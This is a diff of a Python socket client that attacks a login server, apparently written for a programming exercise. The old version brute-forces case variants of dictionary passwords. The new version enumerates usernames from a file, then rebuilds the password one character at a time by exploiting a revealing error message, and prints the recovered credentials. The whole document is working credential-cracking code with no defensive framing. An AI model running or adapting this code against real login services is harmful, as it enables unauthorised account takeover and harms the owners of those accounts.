@@ -1,37 +1,57 @@
+import string
 import sys
 import socket
-import itertools
+import json
 
 args = sys.argv
 address = (args[1], int(args[2]))
 
-passwords = open('passwords.txt', 'r')
+logins = open('logins.txt', 'r')
 
 client_socket = socket.socket()
 client_socket.connect(address)
 
-for line in passwords:
+logon_msg = {"login": '', "password": ' '}
+
+# Find login
+for line in logins:
 
     line = line.strip('\n')
-    chars = [[c, c.upper()] if not c.isdigit() else c for c in line]
-    my_iter = itertools.product(*chars)
+    logon_msg["login"] = line
+    logon_msg_json = json.dumps(logon_msg, indent=4)
+    logon_msg_bytes = logon_msg_json.encode()
 
-    for pwd in my_iter:
-        message_bytes = ''.join(pwd).encode()
-        client_socket.send(message_bytes)
+    client_socket.send(logon_msg_bytes)
 
-        response = client_socket.recv(1024).decode()
+    response_json = client_socket.recv(1024).decode()
+    response = json.loads(response_json)
+    if response["result"] == "Wrong password!":
+        break
 
-        if response == "Connection success!":
-            print(''.join(pwd))
+# Find password
+chars = list(string.ascii_lowercase + string.ascii_uppercase) + [str(d) for d in range(10)]
+flag = True
+pwd = ''
+
+while flag:
+
+    for char in chars:
+        logon_msg["password"] = pwd + char
+        logon_msg_json = json.dumps(logon_msg, indent=4)
+        logon_msg_bytes = logon_msg_json.encode()
+
+        client_socket.send(logon_msg_bytes)
+
+        response_json = client_socket.recv(1024).decode()
+        response = json.loads(response_json)
+
+        if response["result"] == "Exception happened during login":
+            pwd = logon_msg['password']
             break
-        elif response == "Too many attempts":
+        elif response["result"] == "Connection success!":
+            print(logon_msg_json)
+            flag = False
             break
 
-    else:
-        continue
-
-    break
-
-passwords.close()
+logins.close()
 client_socket.close()
